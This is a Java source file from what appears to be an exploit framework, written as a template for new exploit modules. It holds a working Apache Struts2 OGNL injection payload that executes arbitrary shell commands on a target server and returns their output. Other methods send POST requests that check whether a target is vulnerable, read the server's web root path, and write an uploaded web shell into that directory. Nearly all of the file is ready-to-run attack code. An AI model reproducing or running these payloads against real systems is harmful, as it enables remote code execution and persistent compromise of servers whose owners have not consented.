package fun.fireline.exp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;

import java.net.URLEncoder;
import java.util.HashMap;
import java.util.UUID;

/**
 * @author yhy
 * @date 2021/8/18 19:37
 * @github https://github.com/yhy0
 * 漏洞利用编写示例 ,必须实现 ExploitInterface
 */

public class Example implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();

    private String payload = "('\\43_memberAccess.allowStaticMethodAccess')(a" +
            ")=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')" +
            "(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')" +
            // payload 为替换命令
            "(c))&(g)(('\\43mycmd\\75\\'payload\\'')(d))&(h)(('\\43myret\\75@java.lang.Runtime@getRuntime()." +
            "exec(\\43mycmd)')(d))&(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')" +
            "(d))&(j)(('\\43myres\\75new\\40byte[51020]')(d))&(k)(('\\43mydat.readFully(\\43myres)')" +
            "(d))&(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))&(m)" +
            "(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')" +
            "(d))&(n)(('\\43myout.getWriter().println(\\43mystr)')(d))";

    private String webPath = "('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context" +
            "[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')" +
            "(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(g)" +
            "(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)" +
            "(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i97)" +
            "(('\\43xman.getWriter().println(\\43req.getRealPath(\"\\u005c\"))')(d))&(i99)" +
            "(('\\43xman.getWriter().close()')(d))";


    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
        // 这里可以通过随机生成的 UUID 判断回显来验证漏洞是否存在，有其他方法更好。
        String uuid =  UUID.randomUUID().toString();
        this.target = url;

        // 添加header头
        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        // 替换payload 中的 payload 字符，为输出UUID
        String data = this.payload.replace("payload", "echo " + uuid);
        // post 请求，根据不同的exp，可能需要不同的请求方式，看需更改
        Response response = HttpTools.post(this.target, data, this.headers, "UTF-8");

        // 看回显，是否存在 202cb962ac59075b964b07152d234b70
        if(response.getText() != null  && response.getText().contains(uuid)) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }

    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        // 替换payload 中的 payload 字符为要执行的命令
        String data = this.payload.replace("payload", cmd);
        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.post(this.target, data, headers, encoding);
        return response.getText();

    }

    // 获取当前的web路径，有最好，没有也无所谓
    @Override
    public String getWebPath() {
        Response response = HttpTools.post(this.target, webPath, headers, "UTF-8");
        return response.getText();
    }


    /*
    上传shell ，有的漏洞需要web的目录，所以就需要getWebPath() ，如果不能自动判断就需要手动指定路径了
    fileContent : 传入的shell文件内容
    filename : 指定的文件名
    platform ： 对方的系统类型，Windows/Linux ,能通用的话就不用管了
     */
    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        String uuid =  UUID.randomUUID().toString();

        // 对传入的文件进行url编码，默认编码为 UTF-8 ，看情况是否需要url编码
        fileContent = URLEncoder.encode(fileContent, "UTF-8" );

        // 写入或者上传文件的payload
        String payload = "('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)" +
                "(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')" +
                "(\\u0023foo\\u003dnew%20java.lang.Boolean(%22false%22)))=&(i1)(('\\43req\\75@org.apache.struts2." +
                "ServletActionContext@getRequest()')(d))=&(i12)(('\\43xman\\75@org.apache.struts2.ServletActionContext" +
                "@getResponse()')(d))=&(i13)(('\\43xman.getWriter().println(\\43req.getServletContext()." +
                "getRealPath(%22\\u005c%22))')(d))=&(i2)(('\\43fos\\75new\\40java.io.FileOutputStream(" +
                "new\\40java.lang.StringBuilder(\\43req.getRealPath(%22\\u005c%22)).append" +
                "(%22/" + filename + "%22).toString())')(d))=&(i3)" +
                "(('\\43fos.write(\\43req.getParameter(%22t%22).getBytes())')(d))=&(i4)" +
                "(('\\43fos.close()')(d))(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')" +
                "(d))=&(i2)(('\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))=&(i95)" +
                "(('\\43xman.getWriter().print(\"" + uuid+ "\")')(d))=&(i99)(('\\43xman.getWriter().close()')" +
                "(d))=&t=" + fileContent;


        this.headers.put("Content-type", "application/x-www-form-urlencoded");
        Response response = HttpTools.post(this.target, payload, headers, "UTF-8");

        String result = response.getText();
        // 也是对输出随机UUID是否一致来判断是否成功的，有其他方法也可以自行改判断
        if(result.contains(uuid)) {
            result = result + "  上传成功! ";
        } else {
            result =  "上传失败";
        }

        return result;
    }

    // 漏洞是否存在
    @Override
    public boolean isVul() {
        return this.isVul;
    }

}
